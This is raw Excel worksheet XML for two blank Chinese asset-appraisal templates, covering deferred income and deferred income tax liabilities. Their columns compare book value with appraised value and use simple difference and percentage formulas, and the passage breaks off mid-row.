    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K30"/>
  <sheetViews>
    <sheetView showGridLines="0" view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="R33" sqref="R33:R35"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="28.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="17.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="12.3333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="22.1666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="9" customWidth="1" style="410" min="12" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>递延收益评估明细表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376" t="n"/>
      <c r="C3" s="376" t="n"/>
      <c r="D3" s="376" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="547" t="n"/>
      <c r="I3" s="547" t="n"/>
      <c r="J3" s="547" t="n"/>
      <c r="K3" s="402" t="inlineStr">
        <is>
          <t>表6-7</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="563">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K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户名（或结算对象）</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>款项内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="122" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t xml:space="preserve"> 备 注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="381" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="587" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="587" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="623" t="n"/>
      <c r="G8" s="560" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="623" t="n"/>
      <c r="G9" s="560" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="623" t="n"/>
      <c r="G10" s="560" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="623" t="n"/>
      <c r="G11" s="560" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="623" t="n"/>
      <c r="G12" s="560" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="623" t="n"/>
      <c r="G13" s="560" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="623" t="n"/>
      <c r="G14" s="560" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="623" t="n"/>
      <c r="G15" s="560" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="623" t="n"/>
      <c r="G16" s="560" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="623" t="n"/>
      <c r="G17" s="560" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="623" t="n"/>
      <c r="G18" s="560" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="623" t="n"/>
      <c r="G19" s="560" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="623" t="n"/>
      <c r="G20" s="560" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="623" t="n"/>
      <c r="G21" s="560" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="623" t="n"/>
      <c r="G22" s="560" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="623" t="n"/>
      <c r="G23" s="560" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="623" t="n"/>
      <c r="G24" s="560" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="623" t="n"/>
      <c r="G25" s="560" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="587" t="n"/>
      <c r="F26" s="623" t="n"/>
      <c r="G26" s="560" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="587" t="n"/>
      <c r="F27" s="587" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="383" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(SUM(F6:F27),2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>ROUND(SUM(G6:G27),2)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>ROUND(SUM(H6:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B2:K2"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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83" fitToHeight="0" blackAndWhite="1" horizontalDpi="300" verticalDpi="300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 codeName="Sheet104">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="T33" sqref="T33"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7" customWidth="1" style="410" min="2" max="2"/>
    <col width="31.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="21" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>递延所得税负债评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="116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402" t="inlineStr">
        <is>
          <t>表6-8</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="624" t="n"/>
      <c r="F8" s="564" t="n"/>
      <c r="G8" s="564">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="564">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="624" t="n"/>
      <c r="F9" s="564" t="n"/>
      <c r="G9" s="564">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="564">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="624" t="n"/>
      <c r="F10" s="564" t="n"/>
      <c r="G10" s="564">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="564">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="624" t="n"/>
      <c r="F11" s="564" t="n"/>
      <c r="G11" s="564">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="564">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="624" t="n"/>
      <c r="F12" s="564" t="n"/>
      <c r="G12" s="564">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="564">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="624" t="n"/>
      <c r="F13" s="564" t="n"/>
      <c r="G13" s="564">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="564">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="624" t="n"/>
      <c r="F14" s="564" t="n"/>
      <c r="G14" s="564">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="564">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="624" t="n"/>
      <c r="F15" s="564" t="n"/>
      <c r="G15" s="564">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="564">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="624" t="n"/>
      <c r="F16" s="564" t="n"/>
      <c r="G16" s="564">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="564">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="624" t="n"/>
      <c r="F17" s="564" t="n"/>
      <c r="G17" s="564">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="564">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="624" t="n"/>
      <c r="F18" s="564" t="n"/>
      <c r="G18" s="564">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="564">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="624" t="n"/>
      <c r="F19" s="564" t="n"/>
      <c r="G19" s="564">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="564">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="624" t="n"/>
      <c r="F20" s="564" t="n"/>
      <c r="G20" s="564">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="564">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="624" t="n"/>
      <c r="F21" s="564" t="n"/>
      <c r="G21" s="564">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="564">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="624" t="n"/>
      <c r="F22" s="564" t="n"/>
      <c r="G22" s="564">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="564">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="624" t="n"/>
      <c r="F23" s="564" t="n"/>
      <c r="G23" s="564">
